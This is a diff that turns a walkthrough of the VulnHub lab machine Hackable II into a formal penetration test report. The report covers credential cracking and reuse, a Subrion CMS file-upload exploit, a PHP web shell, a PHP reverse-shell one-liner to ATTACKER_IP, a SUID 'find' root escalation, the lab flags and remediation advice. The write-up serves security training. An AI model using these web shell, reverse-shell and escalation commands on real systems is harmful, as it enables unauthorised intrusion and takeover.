@@ -1,106 +1,189 @@
-# Hackable II
+# Penetration Test Report — Hackable II
 
-## Overview
+## 1. Executive Summary
 
-* Target: Hackable II
-* Platform: VulnHub
-* Focus: Web exploitation, credential reuse, privilege escalation
+An assessment was conducted against the target system **Hackable II** to evaluate security posture across exposed network services, web application components, and privilege boundaries.
+
+The engagement resulted in **full system compromise**, achieved through a combination of credential reuse, insecure web application functionality, and privilege escalation via misconfigured SUID binaries.
+
+Key contributing factors included:
+
+* Exposure of hashed credentials on a publicly accessible endpoint
+* Weak credential reuse across FTP and web services
+* Vulnerable CMS (Subrion CMS v4.2.1) allowing arbitrary file upload
+* Insecure file handling leading to remote code execution
+* Misconfigured SUID binary enabling root privilege escalation
 
 ---
 
-## Enumeration
+## 2. Scope
 
-Ran a full scan using Nmap:
+**Target System:**
 
-```bash
+* Hackable II (VulnHub VM)
+
+**In-Scope Services:**
+
+* Web server (HTTPS)
+* FTP service
+* Local operating system environment
+
+---
+
+## 3. Methodology
+
+The following structured methodology was applied:
+
+1. Network enumeration and service discovery
+2. Credential discovery and reuse analysis
+3. Web application exploitation
+4. Remote code execution acquisition
+5. Post-exploitation enumeration
+6. Privilege escalation to root
+
+---
+
+## 4. Technical Findings
+
+### 4.1 Network Enumeration
+
+A full port scan was performed using Nmap:
+
+```bash id="xq9p3m"
 nmap -T4 -sV -A -p- TARGET_IP
 ```
 
-Found web services and FTP. The HTTPS service exposed an MD5 hash.
+### Findings:
+
+* Web service (HTTPS)
+* FTP service exposed
+* Web endpoint leaking an MD5 hash
 
 ---
 
-## Initial Access
+## 5. Initial Access
 
-Started by cracking the MD5 hash found on the site. It resolved to:
+### 5.1 MD5 Hash Exposure and Credential Recovery
+
+An MD5 hash was discovered on the HTTPS service. The hash was successfully cracked, yielding:
 
 ```
 hostinger
 ```
 
-Tried logging into FTP with:
+---
+
+### 5.2 FTP Access via Credential Reuse
+
+FTP login was attempted using reused credentials:
 
 ```
 hostinger : hostinger
 ```
 
-and it worked.
-
-Inside FTP, there was a file referencing a Vigenère cipher along with a key. Using the key `hostinger`, I decrypted the provided string and got credentials tied to the hint about “dora”.
+Authentication was successful.
 
 ---
 
-Added the domain to `/etc/hosts`:
+### 5.3 Cipher-Based Credential Discovery
+
+Within the FTP directory, a file was discovered referencing a Vigenère cipher and an associated key.
+
+Using the key:
+
+```
+hostinger
+```
+
+The ciphertext was decrypted, revealing credentials associated with the hint “dora”.
+
+---
+
+### 5.4 Web Application Access
+
+The domain was added to the local hosts file:
 
 ```
 venom.box
 ```
 
-Navigated to the site and found a login panel at `/panel/`. Logging in with the recovered credentials gave access to the admin dashboard.
+A web interface was discovered at:
 
-The site was running **Subrion CMS v4.2.1**, which has known exploits. Using `searchsploit`, I found an arbitrary file upload exploit and ran it:
-
-```bash
-python3 49876.py -u http://venom.box/panel/ --user dora --passw <password>
+```
+/panel/
 ```
 
-This gave a basic shell, but it was limited.
+Using the recovered credentials, access to the administrative dashboard was obtained.
 
 ---
 
-While looking through the upload directory, I found a `.phar` file containing:
+### 5.5 CMS Exploitation (Subrion CMS v4.2.1)
 
-```php
+The target was identified as running:
+
+**Subrion CMS v4.2.1**
+
+This version is publicly known to contain vulnerabilities related to file upload functionality.
+
+Using `searchsploit`, an arbitrary file upload exploit was identified and executed:
+
+```bash id="8j2l9s"
+python3 49876.py -u http://venom.box/panel/ --user dora --passw <password>
+```
+
+This resulted in limited remote shell access.
+
+---
+
+### 5.6 Command Execution via Uploaded Web Shell
+
+During post-exploitation review of uploaded files, a `.phar` file was identified containing:
+
+```php id="k2m7qp"
 <?php system($_GET['cmd']); ?>
 ```
 
-This allowed command execution through the browser:
+This enabled command execution via HTTP requests:
 
 ```
 /uploads/<file>.phar?cmd=
 ```
 
-Used that to trigger a reverse shell:
+A reverse shell was then established using:
 
-```bash
+```bash id="c9v2zd"
 php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 ---
 
-## User Access
+## 6. User Access
 
-After getting a shell, I reused the earlier credentials:
+After obtaining shell access, previously discovered credentials were reused:
 
 ```
 hostinger : hostinger
 ```
 
-and was able to switch to that user.
+This allowed switching to a lower-privileged system user.
 
-In the home directory, `.bash_history` pointed to a backup file. Inside it (via `.htaccess`), I found another set of credentials:
+---
+
+### 6.1 Credential Discovery via Local Artifacts
+
+Further enumeration of the user environment revealed `.bash_history`, which referenced a backup file. Additional credentials were recovered via `.htaccess`-related artifacts:
 
 ```
 nathan : <password>
 ```
 
-Switched to nathan:
+Privilege was escalated to user **nathan**:
 
-```bash
+```bash id="v5r1ta"
 su nathan
 ```
 
-Retrieved the user flag:
+User-level access was confirmed and the user flag was retrieved:
 
 ```
 W3_@r3_V3n0m:P
@@ -108,19 +191,33 @@ W3_@r3_V3n0m:P
 
 ---
 
-## Privilege Escalation
+## 7. Privilege Escalation
 
-Ran enumeration (linpeas) and found that `/usr/bin/find` had the SUID bit set.
+### 7.1 SUID Enumeration
 
-Used it to escalate:
+System enumeration revealed that `/usr/bin/find` had the SUID bit set:
 
-```bash
+```bash id="m1k8hz"
 find . -exec /bin/bash -p \; -quit
 ```
 
-This spawned a root shell.
+---
 
-Retrieved the root flag:
+### 7.2 Root Privilege Escalation
+
+Exploitation of the SUID misconfiguration allowed execution of a privileged shell, resulting in **root access**.
+
+---
+
+## 8. Flags (Proof of Compromise)
+
+* User Flag:
+
+```
+W3_@r3_V3n0m:P
+```
+
+* Root Flag:
 
 ```
 H@v3_a_n1c3_l1fe.
@@ -128,12 +225,49 @@ H@v3_a_n1c3_l1fe.
 
 ---
 
-## Takeaways
+## 9. Impact Assessment
 
-* Always check for hashes or encoded data early—this one led directly to initial access
-* FTP access can expose useful files that aren’t visible via the web interface
-* After logging into a web app, checking the exact version and running `searchsploit` is often worth it
-* Files like `.bash_history` and `.htaccess` are easy wins for credentials
-* SUID binaries (like `find`) are a reliable privilege escalation vector
+Successful exploitation resulted in:
+
+* Exposure and reuse of weak credentials across services
+* Full compromise of a CMS administrative interface
+* Remote code execution on the target system
+* Access to multiple system users
+* Complete root-level compromise via SUID abuse
+
+This represents a **full compromise of confidentiality, integrity, and availability** of the system.
 
 ---
+
+## 10. Recommendations
+
+### 10.1 Credential Security
+
+* Eliminate credential reuse across services (FTP, web apps, system users)
+* Store secrets securely using hashing with strong algorithms (bcrypt, Argon2)
+* Rotate all exposed credentials immediately
+
+### 10.2 Web Application Hardening
+
+* Upgrade Subrion CMS to a patched version
+* Disable or restrict file upload functionality
+* Enforce strict server-side validation of uploaded files
+
+### 10.3 File Exposure Prevention
+
+* Remove `.bash_history` exposure from production environments
+* Secure `.htaccess` and backup files from unauthorized access
+
+### 10.4 Privilege Escalation Mitigation
+
+* Audit and remove unnecessary SUID binaries
+* Specifically restrict SUID permissions on utilities like `find`
+* Apply principle of least privilege across system binaries
+
+---
+
+## 11. Conclusion
+
+The Hackable II system was fully compromised through a chained exploitation process combining credential reuse, vulnerable web application functionality, and misconfigured privilege escalation controls.
+
+The attack demonstrates how multiple low- and medium-severity issues can combine into a critical full-system compromise when left unaddressed.
